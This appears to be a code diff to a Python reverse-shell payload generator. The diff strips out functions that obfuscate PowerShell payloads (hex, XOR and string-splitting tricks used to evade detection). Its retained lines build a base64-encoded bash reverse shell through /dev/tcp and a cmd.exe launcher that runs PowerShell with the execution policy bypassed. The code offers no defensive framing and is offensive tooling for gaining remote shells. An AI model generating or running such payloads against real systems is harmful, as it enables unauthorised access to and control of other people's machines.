@@ -1,76 +1,8 @@
 from __future__ import annotations
 
 import base64
-import random
-import re
 import subprocess
 
-def _to_ps_hex_str(s: str) -> str:
-    hex_bytes = ",".join(f"0x{b:02X}" for b in s.encode())
-    return f"([System.Text.Encoding]::UTF8.GetString([byte[]]({hex_bytes})))"
-
-def _ps_hex_obfuscate(payload: str) -> str:
-    return re.sub(r"'([^']*)'", lambda m: _to_ps_hex_str(m.group(1)), payload)
-
-_PS_CMDLETS = [
-    "Invoke-Expression",
-    "New-Object",
-    "Out-String",
-    "Get-Content",
-    "Write-Host",
-    "iex",
-    "pwd",
-]
-
-def _random_split(cmdlet: str) -> str:
-    i = random.randint(1, len(cmdlet) - 1)
-    p1, p2 = cmdlet[:i], cmdlet[i:]
-    q = random.choice(('"', "'"))
-    return f'&({q}{p1}{q}+{q}{p2}{q})'
-
-def _ps_syntax_obfuscate(payload: str) -> str:
-    result = payload
-    for cmdlet in _PS_CMDLETS:
-        result = re.sub(
-            rf'(?<![.\w]){re.escape(cmdlet)}(?![\w])',
-            lambda _, c=cmdlet: _random_split(c),
-            result,
-        )
-    return result
-
-def _format_split(s: str) -> str:
-    if len(s) < 2:
-        return f"'{s}'"
-    n = random.randint(2, min(3, len(s)))
-    indices = sorted(random.sample(range(1, len(s)), n - 1))
-    parts, prev = [], 0
-    for idx in indices:
-        parts.append(s[prev:idx])
-        prev = idx
-    parts.append(s[prev:])
-    placeholders = "".join(f"{{{i}}}" for i in range(n))
-    parts_str = ",".join(f"'{p}'" for p in parts)
-    return f"('{placeholders}' -f {parts_str})"
-
-def _ps_format_obfuscate(payload: str) -> str:
-    return re.sub(
-        r"'([^']{2,})'",
-        lambda m: _format_split(m.group(1)),
-        payload,
-    )
-
-def _xor_encode_str(s: str) -> str:
-    key = random.randint(1, 255)
-    var = f"k{random.randint(1000, 9999)}"
-    hex_bytes = ",".join(f"0x{(ord(c) ^ key):02x}" for c in s)
-    return f"$(${var}={key};$b=[byte[]]({hex_bytes});-join($b|%{{[char]($_-bxor${var})}}))"
-
-def _ps_xor_obfuscate(payload: str) -> str:
-    return re.sub(
-        r"'([^']{2,})'",
-        lambda m: _xor_encode_str(m.group(1)),
-        payload,
-    )
 
 def get_interfaces() -> dict[str, str]:
     result = {}
@@ -89,9 +21,11 @@ def get_interfaces() -> dict[str, str]:
         pass
     return result
 
+
 def _b64_payload(ip: str, port: int) -> str:
     raw = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
     return base64.b64encode(raw.encode()).decode()
+
 
 def _build_payloads(ip: str, port: int) -> dict[str, str]:
     _CMD_PAYLOAD = rf"""
@@ -130,6 +64,7 @@ $client.Close()
         "powershell":         _PS_BASE,
         "cmd.exe":            f"powershell -nop -ep bypass -c \"{_CMD_PAYLOAD}\"",
     }
+
 
 class PayloadGenerator:
 
